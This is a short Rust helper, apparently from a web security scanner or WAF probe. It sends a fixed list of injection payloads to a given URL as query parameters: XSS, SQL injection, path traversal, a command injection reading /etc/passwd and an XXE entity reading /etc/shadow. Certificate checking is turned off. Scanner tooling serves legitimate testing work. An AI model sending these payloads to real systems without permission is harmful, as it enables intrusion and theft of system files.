use std::collections::HashMap;

use anyhow::Result;
use lazy_static::lazy_static;
use rand::{distributions::Alphanumeric, thread_rng, Rng};

lazy_static! {
    static ref ATTACKVALUE: Vec<&'static str> = vec![
        "<script>alert(\"XSS\");</script>",
        "UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '",
        "../../../../etc/passwd",
        "/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com",
        "<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn>",
    ];
}

pub struct Help {
    pub http_client: reqwest::blocking::Client,
}

impl Default for Help {
    fn default() -> Self {
        Self::new()
    }
}

impl Help {
    pub fn new() -> Self {
        let client = reqwest::blocking::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .cookie_store(true)
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        Help {
            http_client: client,
        }
    }
    pub fn random_key(&self) -> String {
        let mut rng = thread_rng();
        let chars: String = (0..7).map(|_| rng.sample(Alphanumeric) as char).collect();
        chars
    }

    pub fn generate_attack_params(&self) -> HashMap<String, String> {
        let mut map = HashMap::new();
        for v in ATTACKVALUE.iter() {
            let key = self.random_key();
            map.insert(key, v.to_string());
        }
        map
    }

    pub fn attack(&self, url: &str) -> Result<reqwest::blocking::Response> {
        let params = self.generate_attack_params();
        let resp = self.http_client.get(url).query(&params).send()?;

        Ok(resp)
    }
}
